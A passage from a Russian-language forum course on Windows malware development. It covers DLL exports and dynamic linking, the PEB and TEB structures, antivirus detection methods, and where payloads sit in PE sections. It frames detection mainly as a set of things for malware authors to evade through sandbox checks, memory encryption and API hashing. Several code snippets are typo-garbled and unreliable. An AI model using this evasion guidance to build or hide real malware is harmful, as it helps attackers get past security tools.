DWORD ul_reason_for_call, // Reason for calling function
LEVOID lpReserwved // Reserved
)
{
switch (ul_reason_for_call)

case DLL_PROCESS_ATTACH: //Load to process
// Do something here
break;

DLL_THREAD_ATTACH: // A a new thread.
// Do socmething here
break;

case DLL_THREAD_DETACH // А thread exits normally.
// Do something here
break;

case DLL_PROCESS_DETACH: // A process unloads the DLL.
// Do something here
break;

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Экспорт функции</b><br />
<br />
DLL-файлы могут экспортировать функции, которые могут быть использованы вызывающим приложением или процессом. Чтобы экспортировать функцию, она должна быть определена с использованием ключевых слов extern и __declspec(dllexport). Приведен ниже пример экспортированной функции HelloWorld.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>extern _ declspec(dllexport) void HelloWorld() {
// Function code here
}</code></pre>
	</div>
</div><br />
<b>Динамическое связывание</b><br />
<br />
Можно использовать WinAPI, такие как LoadLibrary, GetModuleHandle и GetProcAddress, чтобы импортировать функцию из DLL. Этот процесс называется динамическим связыванием.<br />
Это метод загрузки и связывания кода (DLL) во время выполнения, а не связывания их на этапе компиляции с помощью компоновщика и таблицы адресов импорта.<br />
<br />
Существует несколько преимуществ использования динамического связывания, их подробное описание можно найти в документации Microsoft.<br />
<br />
В этом разделе рассматриваются шаги по загрузке DLL, получению дескриптора DLL, извлечению адреса экспортированной функции и последующему вызову этой функции.<br />
<br />
<b>Загрузка DLL</b><br />
<br />
Вызов функции, например MessageBoxA, в приложении заставит ОС Windows загрузить DLL, экспортирующую функцию MessageBoxA, в адресное пространство памяти вызывающего процесса, в данном случае это user32.dll. Загрузка user32.dll была выполнена автоматически ОС при запуске процесса, а не кодом.<br />
<br />
Однако в некоторых случаях, эта DLL может <b><u>не быть загружена в память</u></b>. Чтобы приложение могло вызвать функцию, ему сначала нужно получить дескриптор DLL, экспортирующий эту функцию. Для этого потребуется использовать функцию WinAPI LoadLibrary, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HMODULE hModule = LoadLibraryA(&quot;sampleDLL.d11&quot;); // hMedule now contain sampleDLL.dll&#039;s handle</code></pre>
	</div>
</div><br />
<b>Получение адреса функции</b><br />
<br />
После того как DLL загружена в память и дескриптор получен, следующий шаг - это получение адреса функции. Это делается с помощью функции WinAPI GetProcAddress, которая принимает дескриптор DLL, экспортирующего функцию, и имя функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>PVOID pHelloWorld = GetProcAddress(hModule, &quot;HelloWorld&quot;);</code></pre>
	</div>
</div><br />
<b>Вызов функции</b><br />
<br />
После сохранения адреса HelloWorld в переменной pHelloWorld, следующим шагом является приведение типа этого адреса к указателю функции HelloWorld. Этот указатель на функцию требуется для вызова функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef void (WINAPI* HelloWorldFunctionPointer) ();
HelloWorldFunctionPointer HelloWorld = (HelloWorldFunctionPointer)pHelloWorld;
HelloWorld();</code></pre>
	</div>
</div><br />
<b>Пример динамического связывания</b><br />
<br />
Ниже представлен еще один простой пример динамического связывания, где вызывается MessageBoxA. Код предполагает, что user32.dll экспортирующая эту функцию не загружена в память. Напоминаю, что если DLL не загружена в память, для загрузки этой DLL в адресное пространство процесса требуется использование LoadLibrary.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef int (WINAPI* MessageBoxAFunctionPointer)(HWND, LPCSTR, LPCSTR, UINT);
MessageBoxAFunctionPointer pMessageBoxA = (MessageBoxAFunctionPointer)GetProcAddress(LoadLibrary(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;);
if (pMessageBoxA) {
    pMessageBoxA(NULL, &quot;Текст MessageBox&quot;, &quot;Заголовок MessageBox&quot;, 0);
}</code></pre>
	</div>
</div><br />
<b>Указатели на функции</b><br />
<br />
На протяжении оставшегося курса типы данных указателей на функции будут иметь именование, которое использует имя WinAPI с префиксом fp, что означает &quot;указатель на функцию&quot;. Например, вышеуказанный тип данных MessageBoxAFunctionPointer будет представлен как fpMessageBoxA. Это используется для упрощения и повышения ясности на протяжении курса.<br />
<br />
<b>Rundll32.exe</b><br />
<br />
Существует несколько способов запуска экспортированных функций без использования программного метода.<br />
<b>Одна из общеизвестных техник</b> - использование бинарного файла rundll32.exe. Rundll32.exe - это встроенный бинарник Windows, который используется для запуска экспортированной функции DLL. Для запуска экспортированной функции используйте следующую команду:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rundll32.exe &lt;имя_dll&gt;, &lt;экспортированная функция для запуска&gt;</code></pre>
	</div>
</div><br />
<b>Создание файла DLL с помощью Visual Studio</b><br />
<br />
Чтобы создать файл DLL, запустите Visual Studio и создайте новый проект. Когда вам будут предложены шаблоны проектов, выберите опцию &quot;Dynamic-Link Library (DLL)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731898327.png"
		data-src="https://osint42.org/attachments/1746731898327-png.46/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731898327-png.46/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731898327.png"
			title="1746731898327.png"
			width="1492" height="815" loading="lazy" />
	</div><br />
<br />
Далее будут сгенерированы шаблоны, в которых уже можно писать код (dllmain.cpp):<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731906182.png"
		data-src="https://osint42.org/attachments/1746731906182-png.47/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731906182-png.47/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731906182.png"
			title="1746731906182.png"
			width="1345" height="370" loading="lazy" />
	</div><br />
<br />
Предоставленный шаблон DLL поставляется с framework.h, pch.h и pch.cpp, которые известны как предварительно скомпилированные заголовки. Эти файлы используются для ускорения компиляции проекта для больших проектов. Вряд ли они понадобятся в этой ситуации, поэтому рекомендуется удалить эти файлы. Для этого выделите файл и нажмите клавишу удаления, затем выберите опцию &quot;Удалить&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731913819.png"
		data-src="https://osint42.org/attachments/1746731913819-png.48/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731913819-png.48/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731913819.png"
			title="1746731913819.png"
			width="1341" height="367" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731921748.png"
		data-src="https://osint42.org/attachments/1746731921748-png.49/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731921748-png.49/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731921748.png"
			title="1746731921748.png"
			width="642" height="367" loading="lazy" />
	</div><br />
<br />
После удаления предварительно скомпилированных заголовков необходимо изменить настройки компилятора по умолчанию, чтобы подтвердить, что в проекте не следует использовать предварительно скомпилированные заголовки.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731928464.png"
		data-src="https://osint42.org/attachments/1746731928464-png.50/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731928464-png.50/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731928464.png"
			title="1746731928464.png"
			width="653" height="547" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731936006.png"
		data-src="https://osint42.org/attachments/1746731936006-png.51/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731936006-png.51/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731936006.png"
			title="1746731936006.png"
			width="1165" height="535" loading="lazy" />
	</div><br />
<br />
Перейдите к вкладке C/C++.<br />
<br />
Измените параметр &quot;Предварительно скомпилированный заголовок&quot; на &quot;Не использовать предварительно скомпилированные заголовки&quot;и нажмите &quot;Применить&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731943698.png"
		data-src="https://osint42.org/attachments/1746731943698-png.52/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731943698-png.52/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731943698.png"
			title="1746731943698.png"
			width="962" height="563" loading="lazy" />
	</div><br />
<br />
Наконец, можно изменить файл dllmain.cpp на dllmain.c. Это необходимо, если вы используете C вместо C++. Для компиляции программы выберите Сборка &gt; Собрать решение, и DLL будет создан в папке Release или Debug, в зависимости от конфигурации компиляции.</div>
						

							<h2>Процессы Windows</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732086378.png"
		data-src="https://osint42.org/attachments/1746732086378-png.53/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732086378-png.53/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732086378.png"
			title="1746732086378.png"
			width="786" height="537" loading="lazy" />
	</div><br />
<br />
В предыдущих версиях статей, было очень краткое ознакомление каких-то базовых вещей, без которых вообще проблематично вести разработку.<br />
Понятно что этого недостаточно, но какое-то направление может дать.<br />
<br />
Думаю это последняя статья, по теории и следующие статьи будут уже предметные, посвященные конкретно малвари...<br />
<br />
<b>Что такое процесс Windows?<br />
<br />
Процесс Windows </b>- это программа или приложение, выполняющееся на машине с Windows. Процесс может быть запущен как пользователем, так и самой системой. Процесс потребляет ресурсы, такие как память, дисковое пространство и процессорное время, чтобы выполнить задачу.<br />
<br />
<b>Потоки процесса</b><br />
<br />
Процессы Windows состоят из одного или нескольких потоков, которые выполняются одновременно. Поток — это набор инструкций, которые могут выполняться независимо в рамках процесса. Потоки внутри процесса могут обмениваться данными. Потоки планируются к выполнению операционной системой и управляются в контексте процесса.<br />
<br />
<b>Память процесса</b><br />
<br />
Процессы Windows также используют память для хранения данных и инструкций. Память выделяется для процесса при его создании, и объем выделенной памяти может устанавливаться самим процессом. Операционная система управляет памятью с использованием виртуальной и физической памяти. Виртуальная память позволяет операционной системе использовать больше памяти, чем физически доступно, создавая виртуальное адресное пространство, которое может быть доступно приложениям. Эти виртуальные адресные пространства разделены на &quot;страницы&quot;, которые затем выделяются процессам.<br />
<br />
<b>Типы памяти</b><br />
<br />
Процессы могут иметь разные типы памяти:<br />
<ul>
<li data-xf-list-type="ul">Приватная память предназначена для одного процесса и не может быть поделена с другими процессами. Этот тип памяти используется для хранения данных, специфичных для процесса.</li>
<li data-xf-list-type="ul">Отображенная память может быть разделена между двумя или несколькими процессами. Она используется для обмена данными между процессами, например, общими библиотеками, общими сегментами памяти и общими файлами. Отображенная память видима для других процессов, но защищена от изменений другими процессами.</li>
<li data-xf-list-type="ul">Память образа содержит код и данные исполняемого файла. Она используется для хранения кода и данных, используемых процессом, таких как код программы, данные и ресурсы. Память образа часто связана с файлами DLL, загруженными в адресное пространство процесса.</li>
</ul><b>Process Environment Block (PEB)<br />
<br />
Process Environment Block (PEB)</b> - это структура данных в Windows, которая содержит информацию о процессе, такую как его параметры, информацию о запуске, информацию о выделенной куче, загруженные DLL и другое. Он используется операционной системой для хранения информации о запущенных процессах и загрузчиком Windows для запуска приложений. Также он хранит информацию о процессе, такую как идентификатор процесса (PID) и путь к исполняемому файлу.<br />
<br />
Каждый созданный процесс имеет свою собственную структуру данных PEB, которая содержит свой собственный набор информации о нем.<br />
<br />
<b>Структура PEB</b><br />
<br />
Структура PEB в C показана ниже. Зарезервированные члены этой структуры можно игнорировать.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, *PPEB;</code></pre>
	</div>
</div><br />
Незарезервированные члены объясняются ниже.<br />
<br />
<b>BeingDebugged</b><br />
<br />
BeingDebugged - это флаг в структуре PEB, который указывает, отлаживается процесс или нет. Он устанавливается в 1 (TRUE), когда процесс отлаживается, и 0 (FALSE), когда он не отлаживается. Он используется загрузчиком Windows для определения, следует ли запускать приложение с подключенным отладчиком или нет.<br />
<br />
<b>Ldr</b><br />
<br />
Ldr - это указатель на структуру PEB_LDR_DATA в PEB. Эта структура содержит информацию о модулях динамической библиотеки (DLL) процесса. Она включает в себя список загруженных в процесс DLL, базовый адрес каждой DLL и размер каждого модуля. Он используется загрузчиком Windows для отслеживания загруженных в процесс DLL. Структура PEB_LDR_DATA показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre>
	</div>
</div><br />
Ldr может быть использован для поиска базового адреса определенной DLL, а также для определения функций, находящихся в ее адресном пространстве. Это будет использоваться в будущих модулях для создания пользовательской версии GetModuleHandleA/W для дополнительной скрытности.<br />
<br />
<b>ProcessParameters</b><br />
<br />
ProcessParameters - это структура данных в PEB. Она содержит параметры командной строки, переданные процессу при его создании. Загрузчик Windows добавляет эти параметры в структуру PEB процесса. ProcessParameters - это указатель на структуру RTL_USER_PROCESS_PARAMETERS, показанную ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[116];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre>
	</div>
</div><br />
ProcessParameters будет использоваться в будущих статьях для выполнения таких действий, как подмена командной строки.<br />
<br />
<b>AtlThunkSListPtr &amp; AtlThunkSListPtr32</b><br />
<br />
AtlThunkSListPtr и AtlThunkSListPtr32 используются модулем ATL (Active Template Library) для хранения указателя на связанный список функций преобразования. Функции преобразования используются для вызова функций, реализованных в другом адресном пространстве, они часто представляют функции, экспортируемые из файла DLL (Dynamic Link Library). Связанный список функций преобразования используется модулем ATL для управления процессом преобразования.<br />
<br />
<b>PostProcessInitRoutine</b><br />
<br />
Поле PostProcessInitRoutine в структуре PEB используется для хранения указателя на функцию, которая вызывается операционной системой после завершения инициализации TLS (Thread Local Storage) для всех потоков в процессе. Эта функция может быть использована для выполнения любых дополнительных задач инициализации, необходимых для процесса.<br />
<br />
TLS и обратные вызовы TLS будут рассмотрены подробнее позже, когда это потребуется.<br />
<br />
<b>SessionId</b><br />
<br />
SessionId в PEB - это уникальный идентификатор, присвоенный одной сессии. Он используется для отслеживания активности пользователя во время сессии.<br />
<br />
<b>Thread Environment Block (TEB)</b><br />
<br />
Thread Environment Block (TEB) - это структура данных в Windows, которая хранит информацию о потоке. Он содержит окружение потока, контекст безопасности и другую связанную информацию. Он хранится в стеке потока и используется ядром Windows для управления потоками.<br />
<br />
<b>Структура TEB</b><br />
<br />
Структура TEB в C показана ниже. Зарезервированные члены этой структуры можно игнорировать.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
    PVOID Reserved2[399];
    BYTE Reserved3[1952];
    PVOID TlsSlots[64];
    BYTE Reserved4[8];
    PVOID Reserved5[26];
    PVOID ReservedForOle;
    PVOID Reserved6[4];
    PVOID TlsExpansionSlots;
} TEB, *PTEB;</code></pre>
	</div>
</div><br />
<b>ProcessEnvironmentBlock (PEB)</b><br />
<br />
Это указатель на структуру PEB, рассмотренную выше. PEB находится внутри Блока окружения потока (TEB) и используется для хранения информации о текущем выполняющемся процессе.<br />
<br />
<b>TlsSlots</b><br />
<br />
Слоты TLS (Thread Local Storage) - это места в TEB, которые используются для хранения данных, специфичных для потока. Каждый поток в Windows имеет свой собственный TEB, и каждый TEB имеет набор слотов TLS. Приложения могут использовать эти слоты для хранения данных, специфичных для этого потока, таких как переменные, специфичные для потока, дескрипторы, специфичные для потока, состояния и так далее.<br />
<br />
<b>TlsExpansionSlots</b><br />
<br />
Слоты расширения TLS в TEB - это набор указателей, используемых для хранения данных локального хранилища потока. Слоты расширения TLS зарезервированы для использования системными DLL.<br />
<br />
<b>Дескрипторы процесса и потока</b><br />
<br />
В операционной системе Windows каждый процесс имеет уникальный идентификатор процесса или идентификатор процесса (PID), который операционная система присваивает при создании процесса. PIDs используются для различия одного работающего процесса от другого. Та же концепция применяется к работающему потоку, где работающий поток имеет уникальный идентификатор, который используется для его отличия от остальных существующих потоков (в любом процессе) в системе.<br />
<br />
Эти идентификаторы можно использовать для открытия дескриптора процесса или потока с использованием нижеуказанных WinAPI:<br />
<ul>
<li data-xf-list-type="ul">OpenProcess - открывает существующий дескриптор объекта процесса через его идентификатор.</li>
<li data-xf-list-type="ul">OpenThread - открывает существующий дескриптор объекта потока через его идентификатор.</li>
</ul>Эти WinAPI будут рассмотрены подробнее позже, когда это потребуется. На данный момент достаточно знать, что открытый дескриптор может быть использован для выполнения дополнительных действий с соответствующим объектом Windows, таким как приостановка процесса или потока.<br />
<br />
Дескрипторы всегда следует закрывать после того, как они больше не требуются, чтобы избежать утечки дескрипторов. Это достигается с помощью вызова WinAPI CloseHandle.</div>
						

							<h2>Виды детектов</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732171435.png"
		data-src="https://osint42.org/attachments/1746732171435-png.54/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732171435-png.54/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732171435.png"
			title="1746732171435.png"
			width="822" height="516" loading="lazy" />
	</div><br />
<br />
<b>Введение</b><br />
<br />
Системы безопасности используют несколько техник для обнаружения вредоносного программного обеспечения.<br />
Важно понимать, какие методы системы безопасности используют для классификации ПО как вредоносное.<br />
<br />
<b>Статическое по сигнатуре обнаружение<br />
<br />
Сигнатура</b> - это ряд байтов или строк внутри вредоносного ПО, которые уникально его идентифицируют. Могут указываться и другие условия, такие как имена переменных и импортируемые функции. Как только система безопасности сканирует программу, она пытается сопоставить ее со списком известных правил. Эти правила должны быть предварительно созданы и загружены в систему безопасности.<br />
YARA - это один из инструментов, который используют производители безопасности для создания правил обнаружения. Например, если шелл-код содержит последовательность байтов, которая начинается с ЕС 48 83 Е4 ЕО E8 СО 00 00 00 41 51 41 50 52 51, это можно использовать для обнаружения того, что полезная нагрузка является полезной нагрузкой Msfvenom&#039;s x64 exec. Тот же механизм обнаружения можно использовать для строк внутри файла.<br />
<br />
Обнаружение по сигнатуре легко обойти, но это может занять много времени. Важно избегать жесткого кодирования значений в вредоносном ПО, которые можно использовать для уникальной идентификации реализации. Код, представленный на этом курсе, пытается избегать жесткого кодирования значений, которые могут быть закодированы, и вместо этого динамически извлекает или вычисляет значения.<br />
<br />
<b>Обнаружение по хешу</b><br />
<br />
Обнаружение по хешу является подмножеством статического обнаружения по сигнатуре. Это очень простой метод обнаружения, и это самый быстрый и простой способ, которым система безопасности может обнаружить вредоносное ПО. Этот метод заключается в сохранении хешей (например, MD5, SHA256) известного вредоносного ПО в базе данных. Хеш файла вредоносного ПО будет сравниваться с базой данных хешей системы безопасности, чтобы увидеть, есть ли совпадение.<br />
<br />
Уклонение от обнаружения по хешу чрезвычайно простое, хотя, вероятно, этого недостаточно само по себе. Изменяя хотя бы 1 байт в файле, хеш файла изменится для любого алгоритма хеширования, и, следовательно, файл будет иметь уникальный хеш файла.<br />
<br />
<b>Эвристическое обнаружение</b><br />
<br />
Поскольку методы обнаружения по сигнатуре легко обходятся с незначительными изменениями в вредоносном файле, было введено эвристическое обнаружение, чтобы выявлять подозрительные характеристики, которые можно найти в неизвестных, новых и модифицированных версиях существующего вредоносного ПО. В зависимости от системы безопасности, эвристические модели могут состоять из одного или обоих следующих механизмов:<br />
<ul>
<li data-xf-list-type="ul">Статический эвристический анализ - включает в себя декомпиляцию подозрительной программы и сравнение фрагментов кода с известным вредоносным ПО, которое уже известно и находится в базе данных эвристического анализа. Если определенный процент исходного кода соответствует чему-либо в базе данных эвристического анализа, программа помечается.</li>
<li data-xf-list-type="ul">Динамический эвристический анализ - программа помещается в виртуальную среду или песочницу, которая затем анализируется системой безопасности на наличие любых подозрительных действий.</li>
</ul><b>Динамический эвристический анализ (Обнаружение в песочнице)</b><br />
<br />
Обнаружение в песочнице динамически анализирует поведение файла, выполняя его в изолированной среде. При выполнении файла система безопасности будет искать подозрительные действия или действия, которые классифицируются как вредоносные. Например, выделение памяти не является обязательно вредоносным действием, но выделение памяти, подключение к интернету для получения шелл-кода, запись шелл-кода в память и его выполнение в этой последовательности считается вредоносным поведением.<br />
<br />
Разработчики вредоносного ПО встраивают техники обнаружения песочницы, чтобы определить среду песочницы. Если вредоносное ПО подтверждает, что оно выполняется в песочнице, тогда оно выполняет безвредный код, в противном случае - вредоносный код.<br />
<br />
<b>Обнаружение на основе поведения</b><br />
<br />
Как только вредоносное ПО запускается, системы безопасности продолжают искать подозрительное поведение, совершаемое работающим процессом. Система безопасности будет искать подозрительные индикаторы, такие как загрузка DLL, вызов определенного API Windows и подключение к интернету. Как только подозрительное поведение обнаружено, система безопасности проводит сканирование процесса в памяти. Если процесс определен как вредоносный, он завершается.<br />
<br />
Определенные действия могут завершить процесс немедленно без выполнения сканирования в памяти. Например, если вредоносное ПО выполняет инъекцию процесса в notepad.exe и подключается к интернету, это, вероятно, приведет к немедленному завершению процесса из-за высокой вероятности того, что это вредоносная активность.<br />
<br />
Лучший способ избежать обнаружения на основе поведения - заставить процесс вести себя как можно более безвредно (например, избегать запуска дочернего процесса cmd.exe). Кроме того, сканирование в памяти можно обойти с помощью шифрования памяти. Это более сложная тема, которая будет обсуждаться в будущих модулях.<br />
<br />
<b>API-перехват</b><br />
<br />
API-перехват - это техника, используемая системами безопасности, в основном EDR, для мониторинга процесса или выполнения кода в реальном времени на предмет вредоносного поведения. API-перехват работает путем перехвата часто злоупотребляемых API и затем анализа параметров этих API в реальном времени. Это хороший способ обнаружения, потому что это позволяет системе безопасности видеть содержимое, переданное API, после его дешифровки или расшифровки.<br />
<br />
Это обнаружение считается комбинацией обнаружения в реальном времени и на основе поведения.<br />
<br />
Диаграмма ниже показывает алгоритм API-перехвата.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732182826.png"
		data-src="https://osint42.org/attachments/1746732182826-png.55/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732182826-png.55/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732182826.png"
			title="1746732182826.png"
			width="948" height="337" loading="lazy" />
	</div><br />
<br />
Существует несколько способов обойти API-перехват, такие как отключение DLL и прямые системные вызовы. Эти темы будут рассмотрены в будущих модулях.<br />
<br />
<b>Проверка IAT</b><br />
<br />
Одним из компонентов в структуре PE, является таблица адресов импорта или IAT. Чтобы кратко суммировать функциональность IAT, она содержит имена функций, которые используются в PE во время выполнения. Она также содержит библиотеки (DLL), которые экспортируют эти функции. Эта информация ценна для системы безопасности, так как она знает, какие WinAPI использует исполняемый файл.<br />
<br />
Например, для шифрования файлов в ransomware вероятно, будет использовать криптографические функции и функции управления файлами. Когда система безопасности видит IAT, содержащую эти типы функций, таких как CreateFileaA/W, SetFilePointer, Read/WriteFile, CreateHash, CryptHashData, CryptGetHashParam, тогда или программа помечается, или на нее уделяется дополнительное внимание.<br />
<br />
На изображении ниже показано, как инструмент dumpbin.exe используется для проверки IAT бинарного файла:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732195455.png"
		data-src="https://osint42.org/attachments/1746732195455-png.56/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732195455-png.56/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732195455.png"
			title="1746732195455.png"
			width="641" height="719" loading="lazy" />
	</div><br />
<br />
Один из способов обхода сканирования IAT - использование хеширования API, о котором будет рассказано в будущих модулях.<br />
<br />
<b>Ручной анализ</b><br />
<br />
Несмотря на обход всех вышеупомянутых механизмов обнаружения, аналитики вредоносных программ все равно могут вручную анализировать вредоносное ПО.<br />
Исследователь, хорошо знакомый с обратной инженерией вредоносных программ, вероятно, сможет обнаружить вредоносное ПО. Кроме того, системы безопасности часто отправляют копию подозрительных файлов в облако для дальнейшего анализа.<br />
<br />
Разработчики вредоносного ПО могут реализовать техники против обратного анализа, чтобы усложнить процесс обратной инженерии. К некоторым техникам относятся обнаружение отладчика и обнаружение виртуализированной среды.</div>
						

							<h2>Куда класть нагрузку ?</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732311613.png"
		data-src="https://osint42.org/attachments/1746732311613-png.57/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732311613-png.57/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732311613.png"
			title="1746732311613.png"
			width="636" height="479" loading="lazy" />
	</div><br />
<br />
В этой статье предлагаю поднять тему, куда и как класть нагрузку, он-же Payload.<br />
<br />
Разработчик вредоносного ПО имеет несколько вариантов того, где в файле PE можно хранить полезную нагрузку. В зависимости от выбора полезная нагрузка будет находиться в разных разделах файла PE.<br />
<br />
<b>Полезные нагрузки могут храниться в одном из следующих разделов PE:</b><br />
<br />
.data<br />
.rdata<br />
.text<br />
.rsrc<br />
<br />
<b>Раздел .data</b><br />
<br />
Раздел .data файла PE — это раздел исполняемого файла программы, который содержит инициализированные глобальные и статические переменные. Этот раздел доступен для чтения и записи, что делает его подходящим для зашифрованной полезной нагрузки, которая требует дешифровки во время выполнения.<br />
Если полезная нагрузка является глобальной или локальной переменной, она будет сохранена в разделе .data в зависимости от настроек компилятора.<br />
<br />
Приведенный ниже фрагмент кода показывает пример того, как полезная нагрузка хранится в разделе .data.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
